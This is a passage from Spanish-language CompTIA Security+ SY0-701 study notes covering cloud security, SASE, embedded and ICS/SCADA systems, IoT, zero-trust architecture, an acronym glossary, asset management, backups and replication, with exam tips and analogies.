  - Segregación de datos.
  - Propiedad de los datos.
  - Derechos de auditoría.
  - Procedimientos de backup, recuperación y retención.
  - Cumplimiento: **GDPR, HIPAA, PCI DSS**.
  - Uso de subcontratistas.

> **👉 Enfoque de Examen SY0-701:**
> **CapEx vs. OpEx** es pregunta habitual — nube = OpEx. Scale-Up vs. Scale-Out: Up = más potencia al mismo servidor; Out = más servidores. **PUE** puede aparecer en preguntas sobre eficiencia de datacenter. ISA vs. SLA: ISA = seguridad; SLA = niveles de servicio. Memoriza que GDPR, HIPAA y PCI DSS son los estándares de cumplimiento normativo que suelen mencionarse en el ISA.

## 6.1.11 Aspectos de Seguridad en la Nube a Considerar

### Protección de Datos

- Los datos se almacenan fuera de la infraestructura privada — esencialmente "en Internet".
- **Errores de configuración** pueden tener consecuencias catastróficas.
- Medidas esenciales: controles de acceso + cifrado.
- Los planes de DR (Disaster Recovery) deben actualizarse continuamente.

### Gestión de Parches

- Política clara del CSP sobre frecuencia y velocidad de publicación de parches.
- Funciones que garantizan disponibilidad de parches: gestión automatizada, actualizaciones periódicas, gestión centralizada, supervisión de seguridad, soporte de software de terceros.
- **Desafíos del parcheo en la nube:**
  - Complejidad de sistemas en la nube → difícil identificar vulnerabilidades.
  - Algunos CSP no permiten a los clientes modificar la infraestructura subyacente.
  - El CSP gestiona la infra → pérdida de control directo sobre el calendario de parches.
  - Dificultad para cumplir plazos legales y regulatorios de parcheo.

### SD-WAN (Software-Defined WAN / Red de Área Amplia Definida por Software)

- Conecta sucursales, centros de datos e infraestructura en la nube a través de una **WAN** (Wide Area Network / Red de Área Amplia).
- **Funciones de seguridad clave:**
  - Cifrado de datos en tránsito.
  - Segmentación del tráfico según clasificaciones de prioridad.
  - Enrutamiento inteligente según la aplicación.
  - Integración con cortafuegos.
  - Gestión centralizada de políticas de seguridad.

### SASE (Secure Access Service Edge / Perímetro de Servicio de Acceso Seguro)

- Combina la protección de una **plataforma de acceso seguro** con la agilidad de una **arquitectura de seguridad entregada en la nube**.
- Enfoque centralizado de seguridad y acceso.
- Protección para todos los usuarios, independientemente de su ubicación.
- Opera bajo un modelo de seguridad de **confianza cero**.
- Incorpora **IAM** (Identity and Access Management / Gestión de Identidades y Accesos).
- Asume que todos los usuarios y dispositivos son **no confiables** hasta que se autentiquen y autoricen.
- Funciones de prevención de amenazas: prevención de intrusiones, protección anti-malware, filtrado de contenido.

> **👉 Enfoque de Examen SY0-701:**
> SASE = SD-WAN + seguridad en la nube + Zero Trust. Es una arquitectura moderna importante para el examen. **Distractor:** confundir SASE con SD-WAN — SD-WAN es solo la parte de red; SASE agrega la capa de seguridad integral. Parches en la nube: el cliente puede perder control sobre el calendario → riesgo regulatorio. Preguntas de escenario: "Empresa con empleados remotos en múltiples países necesita acceso seguro centralizado" → SASE.

# 6.2 Sistemas Integrados y Arquitectura de Confianza Cero

## 6.2.1 Sistemas Integrados (Embedded Systems)

> **Analogía:** Un sistema integrado es como el cerebro especializado de un electrodoméstico — no hace de todo, pero hace su tarea específica de manera perfecta, constante y en tiempo real.

Los sistemas integrados se usan en aplicaciones especializadas donde se requiere control preciso en tiempo real.

### Aplicaciones de Sistemas Integrados

| Sector | Ejemplos |
|--------|---------|
| **Electrónica de consumo** | Refrigeradores, lavadoras, cafeteras, termostatos inteligentes |
| **Teléfonos inteligentes y tabletas** | Procesadores, sensores, módulos de comunicación integrados |
| **Automotriz** | Unidades de control del motor, sistemas de entretenimiento, bolsas de aire, frenos ABS |
| **Automatización industrial** | Robots, líneas de montaje, sensores en maquinaria de control |
| **Dispositivos médicos** | Marcapasos, bombas de insulina, monitores de glucosa |
| **Aeroespacial y defensa** | Aeronaves, satélites, equipo militar (navegación, comunicación, control) |

### RTOS (Real-Time Operating System / Sistema Operativo en Tiempo Real)

- Sistema operativo diseñado para aplicaciones que requieren **procesamiento y respuesta en tiempo real**.
- Alta estabilidad y velocidad de procesamiento.

| RTOS | Uso Principal |
|------|--------------|
| **VxWorks** | Sistemas aeroespaciales y de defensa — control de aeronaves, sistemas de guía de misiles |
| **FreeRTOS** | Open source — robótica, automatización industrial, electrónica de consumo |
| **AUTOSAR** (Automotive Open System Architecture) | Industria automotriz — control de motor, transmisión, sistemas de seguridad activa |
| **Siemens SIMATIC WinCC Open Architecture** | Control industrial — automatización de fábricas |

### Riesgos Asociados a los RTOS

- Software complejo y difícil de proteger → vulnerabilidades difíciles de identificar.
- **Ataques a nivel de sistema:** un atacante con acceso puede interrumpir procesos críticos u obtener control del sistema.
- Consecuencias graves: daños a personas o equipos (dispositivos médicos, control industrial).

> **👉 Enfoque de Examen SY0-701:**
> RTOS: la característica clave es "tiempo real" — no confundir con SO convencional. El riesgo en RTOS es que un compromiso puede tener consecuencias físicas (no solo de datos). Recuerda VxWorks = defensa/aeroespacial; FreeRTOS = open source / IoT.

## 6.2.2 Sistemas de Control Industrial (ICS — Industrial Control Systems)

> **Analogía:** Un ICS es el sistema nervioso de una fábrica o planta — los PLC son los nervios periféricos que controlan músculos (actuadores), los sensores son los receptores sensoriales, la HMI es el cerebro consciente que muestra el estado y permite el control, y el servidor SCADA es la conciencia global que supervisa todo.

### Componentes de un ICS

| Componente | Descripción |
|-----------|-------------|
| **ICS** (Industrial Control System) | Mecanismos de automatización de flujo de trabajo y procesos. Controla maquinaria de infraestructuras críticas (energía, agua, sanidad, telecomunicaciones, seguridad nacional). |
| **DCS** (Distributed Control System / Sistema de Control Distribuido) | ICS que administra automatización de procesos dentro de un **único sitio**. |
| **PLC** (Programmable Logic Controller / Controlador Lógico Programable) | Dispositivos integrados en equipos de planta. Vinculados por red serial de campo OT (Operational Technology / Tecnología Operativa) o Ethernet industrial a actuadores y sensores. |
| **HMI** (Human-Machine Interface / Interfaz Hombre-Máquina) | Panel de control local o software en host de computación. Permite configuración y lectura de salida de PLC. |
| **Data Historian** | Base de datos que almacena toda la información generada por el bucle de control. |
| **Actuadores** | Operan válvulas, motores, interruptores y otros componentes mecánicos. |
| **Sensores** | Monitorean estados locales (temperatura, presión, etc.). |

### SCADA (Supervisory Control and Data Acquisition / Control de Supervisión y Adquisición de Datos)

- Reemplaza al servidor de control en **ICS de gran escala y múltiples sitios**.
- Se ejecuta como software en computadoras convencionales.
- Recopila datos y gestiona dispositivos de campo con PLC integrados.
- Usa comunicaciones **WAN** (telefonía móvil o satélite) para enlazar el servidor SCADA con dispositivos de campo.

### Sectores de Aplicación ICS/SCADA

| Sector | Descripción |
|--------|-------------|
| **Energía** | Generación y distribución de energía eléctrica, redes de agua/alcantarillado, transporte |
| **Industrial** | Extracción y refinación de materias primas (hornos, prensas, centrífugas, bombas) |
| **Fabricación/Manufactura** | Sistemas de producción automatizados (forjas, molinos, líneas de montaje) — precisión extrema |
| **Logística** | Sistemas de transporte y elevación automatizados, sensores de seguimiento de componentes |
| **Instalaciones** | Sistemas de gestión de edificios: HVAC (Heating, Ventilation and Air Conditioning / Calefacción, Ventilación y Aire Acondicionado), iluminación, seguridad |

### Seguridad en ICS/SCADA

- Construidos históricamente **sin tener en cuenta la seguridad informática**.
- **Prioridades invertidas respecto a TI tradicional:** Los sistemas industriales priorizan **AIC** (Availability, Integrity, Confidentiality / Disponibilidad, Integridad, Confidencialidad) — la **disponibilidad** es la prioridad máxima, no la confidencialidad. Esto invierte la triada CIA clásica.
- Los procesos industriales involucran componentes electromecánicos peligrosos → **la seguridad (safety) es prioridad absoluta**.

**Riesgos de ciberseguridad:**
- Malware y ransomware.
- Acceso no autorizado.
- Ataques dirigidos (APT).

**Ejemplo histórico — Stuxnet:**
- Gusano diseñado para atacar software SCADA en Windows.
- Objetivo: dañar centrífugas del programa de combustibles nucleares de Irán.
- Primer ciberataque conocido con consecuencias físicas documentadas.

**Controles de protección recomendados (NIST SP 800-82):**
- Segmentación de redes.
- Controles de acceso.
- Sistemas IDS (Intrusion Detection Systems / Sistemas de Detección de Intrusiones).
- Cifrado.
- Monitoreo continuo.

> **👉 Enfoque de Examen SY0-701:**
> **Triada AIC vs. CIA** es crítica: en ICS/SCADA, la disponibilidad viene PRIMERO. Stuxnet es el ejemplo clásico de ataque ICS. Memoriza: PLC → controla actuadores; HMI → interfaz humana; SCADA → supervisión multi-sitio; DCS → un solo sitio. NIST SP 800-82 = referencia para seguridad ICS. OT (Operational Technology) es el término genérico para la tecnología de control industrial, distinto de IT (Information Technology).

## 6.2.3 Internet de las Cosas (IoT — Internet of Things)

> **Analogía:** IoT es como convertir todos los objetos de tu mundo físico en "informantes" que reportan su estado constantemente a una central de datos en la nube — desde el termostato hasta el motor de una turbina.

**Definición:** Red de dispositivos físicos, vehículos, electrodomésticos y objetos con sensores, software y conectividad integrados para recopilar e intercambiar datos.

### Componentes del Ecosistema IoT

| Componente | Función |
|-----------|---------|
| **Sensores** | Detectan cambios en el entorno (temperatura, humedad, movimiento) |
| **Actuadores** | Realizan acciones basadas en datos de sensores (encender luz, ajustar termostato) |
| **Conectividad** | Comunicación entre dispositivos y sistemas (vía Internet) |
| **Sistemas basados en la nube** | Potencia computacional para análisis de grandes volúmenes de datos generados por IoT |

### Ejemplos de IoT por Sector

| Sector | Aplicación |
|--------|-----------|
| **Hogar inteligente** | Control de iluminación, temperatura, sistemas de seguridad de forma remota |
| **Ciudades inteligentes** | Gestión de tráfico, control de calidad del aire, mejora de seguridad pública |
| **Salud** | Dispositivos portátiles e implantables que envían datos de pacientes a proveedores médicos |
| **Agricultura** | Sensores de condiciones del suelo, patrones climáticos, crecimiento de cultivos |

### Factores que Impulsan la Adopción de IoT

- **Reducción de costos** de sensores y dispositivos.
- **Avances en conectividad:** 5G y redes inalámbricas de baja potencia (LPWAN).
- **Big Data y Analytics:** IA y Machine Learning para procesar grandes volúmenes de datos IoT.
- **Pandemia COVID-19:** Aceleró adopción en salud (monitoreo remoto, telemedicina).

### Riesgos de Seguridad de IoT

- **Gran número de dispositivos sin medidas de seguridad adecuadas**.
- **Recursos limitados:** potencia de procesamiento y memoria reducidas → dificulta implementar controles robustos.
- **Falta de estandarización:** problemas de compatibilidad, distintos requisitos y protocolos de seguridad.
- **Volumen masivo de datos:** dificulta proteger información sensible.
- **Vulnerabilidades de diseño:** dispositivos diseñados priorizando funcionalidad sobre seguridad.
- **Presión de costos:** los fabricantes difícilmente pueden priorizar seguridad con márgenes bajos.
- **Lanzamientos sin pruebas de seguridad** adecuadas.
- **Falta de conciencia del usuario:** no cambian contraseñas predeterminadas, no actualizan firmware.

### Casos Históricos de Ataques IoT

| Incidente | Descripción |
|-----------|-------------|
| **Botnet Mirai** | Infectó millones de dispositivos IoT para lanzar ataques DDoS masivos contra sitios web y servicios en línea |
| **Casino y termómetro de pecera** | Un casino fue hackeado a través de un termómetro IoT en una pecera usado como backdoor para acceder a la red del casino |
| **Monitores de bebés y cámaras** | Dispositivos IoT hackeados para espiar a personas |

### Guías de Mejores Prácticas para IoT

- **IoTSF** (Internet of Things Security Foundation) — `iotsecurityfoundation.org`
- **IIC** (Industrial Internet Consortium) Security Framework — `iiconsortium.org/iisf/`
- **CSA** (Cloud Security Alliance) IoT Security Controls Framework
- **ETSI** (European Telecommunications Standards Institute) IoT Security Standards

> **👉 Enfoque de Examen SY0-701:**
> Botnet Mirai es el ejemplo de ataque IoT más citado en exámenes. Los riesgos de IoT se centran en: recursos limitados, falta de estandarización y contraseñas predeterminadas sin cambiar. Recuerda: IoT agrega una superficie de ataque masiva. Pregunta tipo: "¿Cuál es el mayor riesgo de seguridad al implementar dispositivos IoT en una red corporativa?" → dispositivos con firmware sin actualizar y contraseñas predeterminadas.

## 6.2.4 Desperimetrización y Confianza Cero

### El Problema del Perímetro Tradicional

El perímetro tradicional se ha disuelto porque:
- Trabajo remoto con equipos en redes domésticas o Wi-Fi públicas no seguras.
- Infraestructura mixta: on-premises + nube pública.
- Servicios y contratistas externos con acceso remoto.
- **BYOD** (Bring Your Own Device / Trae Tu Propio Dispositivo) — dispositivos personales accediendo a sistemas corporativos.
- Acceso a sistemas críticos mediante interfaces externas.
- Software desarrollado por entidades subcontratadas.

> **Analogía:** El modelo de seguridad tradicional era como un castillo con un foso — todo lo que estaba dentro del foso era de confianza, todo lo que estaba fuera no. Zero Trust es como reemplazar el castillo por un sistema de control de acceso individual en cada habitación, sin importar si estás dentro o fuera del castillo.

### Desperimetrización

- Estrategia que desplaza el enfoque de defender los **límites de la red** a proteger los **datos y recursos individuales** dentro de ella.
- Los modelos tradicionales de seguridad basados en el perímetro son menos efectivos ante:
  - Computación en la nube.
  - Trabajo remoto.
  - Dispositivos móviles.
- Implementa **múltiples medidas de seguridad** en torno a activos individuales.

### Tendencias que Impulsan la Desperimetrización

| Tendencia | Impacto |
|-----------|---------|
| **Enfoque en la nube** | Infraestructura distribuida entre on-premises y nube — sin perímetro claro |
| **Trabajo remoto** | Expande la huella geográfica drásticamente; empleados conectan desde ubicaciones no seguras |
| **Dispositivos móviles** | Cada vez más datos corporativos accedidos desde smartphones/tablets con ciclos de soporte cortos |
| **Externalización y contratación** | Acceso remoto a terceros puede ser punto de entrada a la red corporativa |
| **Redes Wi-Fi** | Redes inalámbricas frecuentemente abiertas, sin protección o con clave ampliamente conocida |

### Confianza Cero (Zero Trust Architecture — ZTA)

**Definición (NIST SP 800-207):** "Paradigmas de ciberseguridad que mueven las estrategias de defensas de los perímetros estáticos basados en redes para centrarse en los usuarios, los activos y los recursos."

**Principio fundamental:** "Nunca confiar, siempre verificar" — todo acceso debe ser verificado y autorizado continuamente.

**Beneficios clave de ZTA:**

| Beneficio | Descripción |
|-----------|-------------|
| **Mayor seguridad** | Todos los usuarios, dispositivos y apps deben autenticarse y verificarse antes del acceso |
| **Mejores controles de acceso** | Límites más estrictos sobre quién/qué puede acceder a recursos y desde qué ubicaciones |
| **Mejora de gobernanza y cumplimiento** | Mayor visibilidad operativa sobre la actividad del usuario y del dispositivo |
| **Mayor granularidad** | Acceso a lo que se necesita, cuando se necesita (principio de mínimo privilegio) |

**Componentes esenciales de ZTA:**

- Seguridad de redes y terminales.
- **IAM** (Identity and Access Management / Gestión de Identidad y Acceso).
- Aplicación basada en políticas.
- Seguridad en la nube.
- Visibilidad de redes (análisis de tráfico).
- Segmentación de redes.
- Protección de datos (cifrado y auditoría).
- Detección y prevención de amenazas.

**Referencias:**
- NIST SP 800-207 — `csrc.nist.gov/publications/detail/sp/800-207/final`
- Modelo de Madurez de Confianza Cero de CISA — `cisa.gov/zero-trust-maturity-model`

> **👉 Enfoque de Examen SY0-701:**
> Zero Trust es uno de los temas más importantes del examen SY0-701. Memoriza la frase "nunca confiar, siempre verificar". **Distractor común:** pensar que Zero Trust elimina la autenticación una vez que el usuario está "dentro" — en ZTA, la verificación es **continua**. BYOD y trabajo remoto son los drivers típicos que llevan a implementar ZTA. NIST SP 800-207 es la referencia normativa de Zero Trust.

## 6.2.5 Conceptos de Seguridad de Confianza Cero

### Conceptos Fundamentales de Zero Trust

| Concepto | Descripción |
|---------|-------------|
| **Identidad adaptativa** | Las identidades de los usuarios no son estáticas; la verificación es continua y basada en el contexto actual y los recursos a los que se intenta acceder |
| **Reducción del alcance de amenazas** | El acceso se otorga según la **necesidad de conocer** (need-to-know) y solo a recursos necesarios para la tarea específica → reduce la superficie de ataque |
| **Control de acceso impulsado por políticas** | Las políticas de control de acceso aplican restricciones basadas en: identidad del usuario, postura del dispositivo y contexto de la red |
| **Postura del dispositivo (Device Posture)** | Estado de seguridad del dispositivo — configuraciones de seguridad, versiones de software y niveles de parches. Se evalúa si el dispositivo cumple requisitos de seguridad |

### Los Planos de Control y Datos en Zero Trust

#### Plano de Control

- **Gestiona las políticas** que determinan cómo usuarios y dispositivos están autorizados para acceder a recursos.
- Se implementa a través de un **Punto de Decisión de Políticas (PDP — Policy Decision Point)** centralizado.

**Subsistemas del PDP:**

| Subsistema | Función |
|-----------|---------|
| **Motor de Políticas (Policy Engine)** | Configurado con identidades, credenciales, políticas de control de acceso, inteligencia de amenazas actualizada, análisis de comportamientos y resultados de monitoreo. Define algoritmos y métricas para tomar **decisiones dinámicas de autenticación y autorización por solicitud**. |
| **Administrador de Políticas (Policy Administrator)** | Gestiona el proceso de emisión de **tokens de acceso** y establece/cierra sesiones según las decisiones del Motor de Políticas. Implementa la interfaz entre el plano de control y el plano de datos. |

#### Plano de Datos

- **Establece sesiones** para transferencias de información seguras.
- Un **sujeto** (usuario o servicio) usa un sistema (laptop, smartphone) para hacer solicitudes de recursos.
- Cada solicitud está mediada por un **PEP (Policy Enforcement Point / Punto de Aplicación de Políticas)**.
- El PEP puede implementarse como agente de software en el host cliente que se comunica con una puerta de enlace de aplicaciones.

### Flujo de una Solicitud en Zero Trust (NIST Framework)

```
1. El Motor de Políticas está configurado con entradas dinámicas
   (identidades, amenazas, comportamientos, posturas de dispositivo)

2. El Administrador de Políticas comunica decisiones al Plano de Datos

3. Los sujetos poseen credenciales para acceder a recursos

4. Los sistemas cliente NO son de confianza implícita

5. El PEP (Punto de Cumplimiento de Políticas) es el ÚNICO de confianza
   para comunicar solicitudes y recibir decisiones del Administrador de Políticas

6. El PEP implementa la configuración y desmontaje de la sesión cifrada
   según las indicaciones del Administrador de Políticas

7. Se crea una zona de confianza implícita de alcance y duración LIMITADOS
```

### Zona de Confianza Implícita

- Ruta de datos establecida entre el **PEP** y el recurso.
- **Ejemplo:** Túnel IPsec entre un agente firmado digitalmente en el cliente, una puerta de enlace de aplicaciones web de confianza y el servidor de recursos.
- IPsec cifra los datos en tránsito → imposibilita la manipulación por parte de cualquier persona con acceso a la infraestructura de red subyacente (switches, APs, routers, firewalls).
- **Objetivo del diseño:** Hacer la zona de confianza implícita lo más **pequeña y transitoria** posible.
- Las sesiones de confianza pueden establecerse únicamente para **transacciones individuales** (microsegmentación).

### Ventajas de la Separación del Plano de Control y Datos

- Arquitectura de red más **flexible y escalable**.
- El plano de control centralizado garantiza consistencia en solicitudes de acceso: tanto en la red empresarial administrada como en Internet no administrado o redes de terceros.
- Facilita la gestión de políticas de control de acceso.
- **Monitoreo continuo:** Las sesiones pueden finalizarse si se detecta comportamiento anómalo.
- La ubicación en la red **NO** es razón suficiente para confiar en una solicitud → incluso un usuario autenticado puede ser bloqueado si el análisis de comportamiento lo detecta como sospechoso.

### Ejemplos de Implementaciones de Zero Trust

| Implementación | Descripción |
|---------------|-------------|
| **Google BeyondCorp** | Referente de ZTA. Sistema multicapa: verificación de identidad + verificación de dispositivos + políticas de control de acceso. Permite acceso remoto de empleados sin VPN tradicional manteniendo alta seguridad. |
| **Cisco Zero Trust Architecture** | Integra segmentación de red, políticas de control de acceso y capacidades de detección y respuesta a amenazas. Protege contra amenazas internas y externas. |
| **Palo Alto Networks Prisma Access** | Servicio de seguridad en la nube con ZTA. Protege tráfico de red, provee acceso seguro a recursos en la nube e Internet, previene exfiltración de datos. |

> **👉 Enfoque de Examen SY0-701:**
> Esta es la sección más densa y técnica de Zero Trust. Memoriza:
> - **Motor de Políticas** = toma las decisiones de autenticación/autorización.
> - **Administrador de Políticas** = emite tokens y gestiona sesiones.
> - **PEP/Punto de Aplicación** = el único punto autorizado para comunicarse con el Administrador de Políticas.
> - **Zona de confianza implícita** = lo más pequeña y temporal posible.
> - **Comportamiento anómalo** puede terminar una sesión aunque el usuario esté autenticado.
>
> **Distractores frecuentes:** confundir el Motor de Políticas con el Administrador de Políticas; pensar que una vez autenticado el acceso es permanente (en ZTA NO lo es). Pregunta tipo: "¿Qué componente de ZTA es responsable de emitir tokens de acceso?" → **Administrador de Políticas**. "¿Qué componente toma la decisión dinámica de autorización?" → **Motor de Políticas**.

# 6.3 Glosario de Acrónimos

| Acrónimo | Significado en inglés | Significado en español |
|---------|----------------------|----------------------|
| **AIC** | Availability, Integrity, Confidentiality | Disponibilidad, Integridad, Confidencialidad |
| **AUTOSAR** | Automotive Open System Architecture | Arquitectura de Sistema Abierto Automotriz |
| **BYOD** | Bring Your Own Device | Trae Tu Propio Dispositivo |
| **CapEx** | Capital Expenditure | Gasto de Capital |
| **CDN** | Content Delivery Network | Red de Distribución de Contenido |
| **CIA** | Confidentiality, Integrity, Availability | Confidencialidad, Integridad, Disponibilidad |
| **CSP** | Cloud Service Provider | Proveedor de Servicios en la Nube |
| **DCS** | Distributed Control System | Sistema de Control Distribuido |
| **DDoS** | Distributed Denial of Service | Denegación de Servicio Distribuida |
| **DR** | Disaster Recovery | Recuperación ante Desastres |
| **FaaS** | Function as a Service | Función como Servicio |
| **GRS** | Geo-Redundant Storage | Almacenamiento Georredundante |
| **HA** | High Availability | Alta Disponibilidad |
| **HCL** | HashiCorp Configuration Language | Lenguaje de Configuración de HashiCorp |
| **HMI** | Human-Machine Interface | Interfaz Hombre-Máquina |
| **HVAC** | Heating, Ventilation and Air Conditioning | Calefacción, Ventilación y Aire Acondicionado |
| **IaaS** | Infrastructure as a Service | Infraestructura como Servicio |
| **IaC** | Infrastructure as Code | Infraestructura como Código |
| **IAM** | Identity and Access Management | Gestión de Identidades y Accesos |
| **ICS** | Industrial Control System | Sistema de Control Industrial |
| **IIC** | Industrial Internet Consortium | Consorcio de Internet Industrial |
| **IoT** | Internet of Things | Internet de las Cosas |
| **IoTSF** | Internet of Things Security Foundation | Fundación de Seguridad del IoT |
| **ISA** | Interconnection Security Agreement | Acuerdo de Seguridad de Interconexión |
| **NFV** | Network Functions Virtualization | Virtualización de Funciones de Red |
| **NIST** | National Institute of Standards and Technology | Instituto Nacional de Estándares y Tecnología |
| **OpEx** | Operational Expenditure | Gasto Operativo |
| **OT** | Operational Technology | Tecnología Operativa |
| **P2P** | Peer-to-Peer | Red de Pares |
| **PaaS** | Platform as a Service | Plataforma como Servicio |
| **PDP** | Policy Decision Point | Punto de Decisión de Políticas |
| **PEP** | Policy Enforcement Point | Punto de Aplicación/Cumplimiento de Políticas |
| **PII** | Personally Identifiable Information | Información de Identificación Personal |
| **PLC** | Programmable Logic Controller | Controlador Lógico Programable |
| **PUE** | Power Usage Effectiveness | Efectividad en el Uso de Energía |
| **RTOS** | Real-Time Operating System | Sistema Operativo en Tiempo Real |
| **SaaS** | Software as a Service | Software como Servicio |
| **SAN** | Storage Area Network | Red de Área de Almacenamiento |
| **SASE** | Secure Access Service Edge | Perímetro de Servicio de Acceso Seguro |
| **SCADA** | Supervisory Control and Data Acquisition | Control de Supervisión y Adquisición de Datos |
| **SD-WAN** | Software-Defined Wide Area Network | Red de Área Amplia Definida por Software |
| **SDN** | Software-Defined Networking | Redes Definidas por Software |
| **SLA** | Service Level Agreement | Acuerdo de Nivel de Servicio |
| **Tor** | The Onion Router | El Enrutador Cebolla |
| **VDI** | Virtual Desktop Infrastructure | Infraestructura de Escritorio Virtual |
| **VM** | Virtual Machine | Máquina Virtual |
| **VPC** | Virtual Private Cloud | Nube Privada Virtual |
| **WAN** | Wide Area Network | Red de Área Amplia |
| **XaaS** | Anything as a Service | Cualquier cosa como Servicio |
| **ZTA** | Zero Trust Architecture | Arquitectura de Confianza Cero |

---

# 7 Gestión de Activos y Estrategias de Redundancia

Este tema aborda cómo las organizaciones rastrean, protegen y destruyen sus activos de información, así como las estrategias críticas de redundancia y alta disponibilidad necesarias para garantizar la resiliencia y la continuidad del negocio ante desastres.

## 7.1 Gestión de activos
La **gestión de activos** consiste en identificar, clasificar e inventariar todos los activos de TI (hardware, software, datos, personal) para:

- Conocer la infraestructura completa
- Monitorear actividades no autorizadas
- Identificar vulnerabilidades
- Garantizar parches y actualizaciones correctas
- Apoyar la respuesta a incidentes (aislar activos afectados rápidamente)

> **Analogía:** Imagina que eres el dueño de un almacén. La gestión de activos es el inventario: saber exactamente qué tienes, dónde está, quién es responsable y cuánto vale. Sin ese inventario, no puedes proteger lo que no sabes que tienes.

### 7.1.1 Seguimiento de activos

#### Datos típicos en una base de datos de activos

| Campo | Ejemplo |
|---|---|
| Tipo | Servidor, switch, laptop |
| Modelo | Dell PowerEdge R750 |
| Número de serie | ABC123XYZ |
| ID de activo | AS-0042 |
| Ubicación | Rack 3, CPD Madrid |
| Usuario(s) | dpto. Finanzas |
| Valor | 12.000 € |
| Info de servicio | Garantía hasta 2026 |

#### Asignación/contabilización de activos

- **Asignación de propiedad:** Designar un individuo o equipo responsable de cada activo → cadena clara de responsabilidad.
- **Clasificación de activos:** Organizar por valor, sensibilidad o criticidad → permite aplicar controles de seguridad apropiados y priorizar mantenimiento.
- Ambos procesos requieren **revisiones periódicas** al cambiar el valor o relevancia del activo.

#### Métodos de enumeración de activos

| Método | Descripción | Herramientas ejemplo |
|---|---|---|
| **Inventario manual** | Inspección física, registro de datos | Planillas, Excel |
| **Escaneo de red** | Descubrir dispositivos conectados automáticamente | `Nmap`, `Nessus`, `OpenVAS` |
| **Software de gestión** | Descubre, rastrea y cataloga activos (HW, SW, licencias) | Lansweeper, ManageEngine, SolarWinds |
| **CMDB** (Configuration Management Database) | Repositorio centralizado de activos, configs y relaciones | ServiceNow, BMC Remedy |
| **MDM** (Mobile Device Management) | Gestión de dispositivos móviles | Microsoft Intune, VMware Workspace ONE, MobileIron |
| **Descubrimiento en la nube** | Inventario de activos cloud | AWS Config, Azure Resource Graph, CloudAware |

#### Adquisición/compra de activos — consideraciones de seguridad

- Seleccionar hardware/software con **cifrado incorporado**, arranque seguro y parches regulares.
- Trabajar con **proveedores de renombre** que prioricen la seguridad.
- Verificar integración con la infraestructura existente (firewalls, IDS, **SIEM** — Security Information and Event Management).
- Evaluar el **TCO** (Total Cost of Ownership — Costo Total de Propiedad): precio inicial + costos de mantenimiento + posibles incidentes de seguridad.

> **👉 Enfoque de Examen SY0-701:**
> CompTIA pregunta sobre qué herramienta usar para enumeración de activos en distintos contextos. Distingue bien: **Nmap** = escaneo de red activo; **CMDB** = repositorio centralizado de relaciones/configuraciones; **MDM** = exclusivo para dispositivos móviles. Un distractor clásico es confundir CMDB con una simple BBDD de inventario — la CMDB incluye también las **interdependencias** entre activos.

### 7.1.3 Copias de seguridad de datos

> **Analogía:** Una copia de seguridad es como el seguro del coche: no lo necesitas hasta que lo necesitas, y si no lo tienes en ese momento, el daño puede ser catastrófico.

#### Por qué las técnicas simples son insuficientes en entornos empresariales

| Problema | Impacto |
|---|---|
| Escalabilidad limitada | No gestionan grandes volúmenes de datos |
| Problemas de rendimiento | Ralentizan aplicaciones durante el backup |
| Tiempos de recuperación largos | Tiempo de inactividad prolongado |
| Poca granularidad | No permiten recuperar archivos/BBDD individuales |
| Sin cifrado ni auditoría | Incumplen requisitos regulatorios |

#### Funcionalidades críticas en soluciones empresariales de backup

- Soporte multientorno (virtual, físico, nube)
- **Desduplicación** y compresión (elimina datos redundantes → guarda una sola copia con punteros)
- Recuperación e instantáneas rápidas
- Protección contra **ransomware** y cifrado
- Restauración granular (archivo, carpeta, aplicación)
- Herramientas de monitoreo, alertas e informes
- Integración con virtualización, nube y almacenamiento

#### Desduplicación de datos

Técnica que identifica bloques de datos idénticos y guarda solo una copia, creando referencias/punteros para las demás instancias. Se puede aplicar a nivel de archivo, bloque o byte.

#### Frecuencia de copias de seguridad

Factores que la determinan:
- Requisitos regulatorios
- Volatilidad de los datos
- Rendimiento del sistema
- Capacidades de arquitectura
- Tolerancia al riesgo organizacional

#### Copias en las instalaciones vs. fuera de las instalaciones

| Tipo | Ubicación | Ventaja | Desventaja |
|---|---|---|---|
| **On-site** | Mismo sitio que los sistemas | Recuperación rápida | Vulnerable a desastres físicos y ransomware |
| **Off-site** | Ubicación remota | Protección ante desastres, robos, ransomware | Recuperación más lenta |

> ⚠️ El **ransomware** frecuentemente ataca también la infraestructura de backup. Solución: backups **aislados** (air-gapped), desconectados físicamente de la red.

#### Validación de recuperación

| Técnica | Descripción |
|---|---|
| **Prueba de recuperación completa** | Restaurar todo el sistema en entorno separado y verificar funcionalidad |
| **Prueba de recuperación parcial** | Restaurar archivos/carpetas/BBDD seleccionados |
| **Auditoría periódica de backups** | Verificar registros, horarios y configuraciones |
| **Simulación de DR** | Simular escenarios (fallo HW, ransomware) para evaluar preparación |

> ⚠️ Un backup con "100% de éxito" puede enmascarar problemas que solo se revelan al intentar recuperar. Los tiempos de recuperación suelen ser mucho más largos de lo estimado.

> **👉 Enfoque de Examen SY0-701:**
> Pregunta frecuente: ¿qué tipo de prueba valida que TODOS los sistemas se pueden restaurar? → **Prueba de recuperación completa**. El distractor más común es confundirla con la prueba parcial. También preguntan sobre backups aislados como defensa contra ransomware — recuerda que el término clave es **air-gapped**.

### 7.1.4 Protección avanzada de datos

#### Instantáneas (Snapshots)

Capturan el estado de un sistema en un momento específico.

| Tipo | Descripción | Ejemplo |
|---|---|---|
| **Snapshot de VM** | Captura estado completo de la máquina virtual (memoria, almacenamiento, config) | VMware vSphere, Microsoft Hyper-V |
| **Snapshot de sistema de archivos** | Captura estado del sistema de archivos | ZFS, Btrfs |
| **Snapshot de SAN** | Captura estado del volumen de almacenamiento a nivel de bloque | NetApp, Dell EMC |

> 💡 En Hyper-V, las snapshots se llaman **Checkpoints** (Puntos de control). Los tipos son:
> - **Production checkpoints:** usan tecnología de backup del SO invitado, consistencia de datos (sin info de apps en ejecución)
> - **Standard checkpoints:** capturan el estado actual de las aplicaciones

#### Replicación

Crear y mantener **copias exactas** de datos en sistemas o ubicaciones diferentes.

- **Replicación sincrónica:** consistencia garantizada, sin desfase temporal.
- **Replicación asincrónica:** más rentable, ligeramente menos estricta en consistencia.

Tipos avanzados:
| Tipo | Descripción |
|---|---|
| **Replicación de SAN** | Duplica datos de una SAN a otra en tiempo real o casi real |
| **Replicación de VM** | Mantiene copia actualizada de una VM en host/ubicación diferente |
| **Registro por diario remoto** (Remote Journaling) | Guarda el diario de cambios en ubicación remota |

#### Registro por diario (Journaling)

Los cambios en los datos se guardan en un **diario** separado. Permite:
- Rastrear modificaciones
